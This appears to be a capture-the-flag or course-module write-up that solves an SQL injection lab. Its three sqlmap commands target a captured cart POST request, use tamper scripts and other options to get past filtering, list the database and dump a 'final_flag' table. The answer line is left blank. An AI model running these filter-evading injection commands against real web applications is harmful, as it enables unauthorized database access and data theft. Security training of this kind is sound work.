You are given access to a web application with basic protection mechanisms. Use the skills learned in this module to find the SQLi vulnerability with SQLMap and exploit it accordingly. To complete this module, find the flag and submit it here.

### Solution

1. What's the contents of table final_flag?
```shell
Found a parameter is passed when we add item to card so we intercept POST request and try to sqlmap the id parameter:

> sqlmap -r req  --skip-waf --random-agent --level=5 --risk=3 --batch --current-db --no-cast --chunked --tamper=between,randomcase

DB: production

> sqlmap -r req  --skip-waf --random-agent --level=5 --risk=3 --batch --current-db --no-cast --chunked --tamper=between,randomcase -D production --tables

Table: final_flag

> sqlmap -r req  --skip-waf --random-agent --level=5 --risk=3 --batch --current-db --no-cast --chunked --tamper=between,randomcase -D production -T final_flag --dump

Answer:  
```